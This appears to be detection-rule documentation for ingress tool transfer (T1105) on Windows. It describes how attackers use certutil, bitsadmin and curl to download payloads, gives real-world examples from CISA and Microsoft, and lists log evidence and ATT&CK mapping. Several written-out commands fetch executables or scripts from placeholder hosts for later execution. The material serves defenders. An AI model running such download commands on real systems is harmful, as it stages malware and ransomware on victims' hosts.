# LOLBin download: certutil, bitsadmin, curl (T1105)

## What the attack is
After getting a foothold, an attacker needs their real tools on the
host. Instead of bringing a downloader, they use binaries Windows
already ships and signs: `certutil.exe` (certificate utility with a URL
cache), `bitsadmin.exe` (Background Intelligent Transfer Service
client) and, since Windows 10 1803, `curl.exe`. Allowlisting and
reputation checks trust these binaries, and their network traffic looks
like normal Windows behaviour.

## How the attack happens
1. The attacker can run commands: an implant shell, a web shell, a
   remote management tool, or a user who ran a script.
2. They pull the next stage with one of:
   - `certutil -urlcache -split -f http://host/p.exe C:\Users\Public\p.exe`
     (or `-verifyctl -f -split http://...`);
   - `bitsadmin /transfer job /download /priority foreground http://host/p.ps1 C:\Temp\p.ps1`,
     or `/create` + `/addfile` + `/resume`;
   - `curl.exe -o C:\Users\Public\a.zip https://host/a.zip`
     (`-O`, `--output`, combined flags such as `-sLO`).
3. They run the file: a batch script, a DLL with `rundll32`, an RMM
   installer, or a ransomware payload.
4. The recorded OTRF atomic uses
   `bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/.../T1197.md C:\...\bitsadmin1_flag.ps1`,
   started by `cmd.exe`.

## Real-world use
- CISA advisory AA25-071A, "#StopRansomware: Medusa Ransomware"
  (12 March 2025): "Medusa actors used PowerShell, Windows Command
  Prompt, and certutil for file ingress", with the example
  `cmd.exe /c certutil -f urlcache https://<domain>/<remotefile>.css <localfile>.dll`
  (written without a dash before `urlcache`).
- Microsoft Threat Intelligence, "Threat actors misusing Quick Assist in
  social engineering attacks leading to ransomware" (15 May 2024):
  Storm-1811 "runs a scripted cURL command to download a series of batch
  files or ZIP files", and "uses BITSAdmin to download batch files and
  ZIP files from a malicious site".
- MITRE ATT&CK v20.0 lists 90 groups and 30 campaigns using T1105 (STIX
  bundle read 2026-10-27).

## What it leaves in the logs
- Security 4688 / Sysmon 1: the binary path and a command line with a
  URL and the download switch; the parent shows who asked for it.
- Sysmon 3 (network connection) from `certutil.exe` / `curl.exe`;
  BITS downloads are made by the BITS service (`svchost.exe -k netsvcs
  -s BITS`), so the connection is not attributed to `bitsadmin.exe`.
- Microsoft-Windows-Bits-Client/Operational events 3, 59, 60 for BITS
  jobs (not read by this rule).
- Sysmon 11 (file created) for the downloaded file.
- What the attacker controls: they can rename or copy the binary, use
  PowerShell (`Invoke-WebRequest`, `Start-BitsTransfer`), other LOLBins
  (`mshta`, `msiexec /i http://`, `finger`, `expand` from a WebDAV share)
  or a UNC path instead of a URL.

## Prerequisites
Command execution as any user; outbound HTTP(S) or FTP from the host.

## Mapping
T1105 Ingress Tool Transfer, tactic command-and-control. The bitsadmin
branch is also T1197 (BITS Jobs). The rule maps only T1105, because it
detects the download, not BITS job persistence or `SetNotifyCmdLine`
abuse that T1197 is mostly about; mapping both would overstate coverage
for T1197.

## References
- CISA, "#StopRansomware: Medusa Ransomware", AA25-071A, 12 March 2025,
  https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a
  (fetched 2026-10-27).
- Microsoft Threat Intelligence, "Threat actors misusing Quick Assist in
  social engineering attacks leading to ransomware", 15 May 2024,
  https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/
  (fetched 2026-10-27).
- MITRE ATT&CK T1105, https://attack.mitre.org/techniques/T1105/
  (STIX bundle v20.0 read 2026-10-27).
- OTRF Security-Datasets, cmd_bitsadmin_download_psh_script, commit
  d9d40ef, https://github.com/OTRF/Security-Datasets (fetched 2026-10-27).
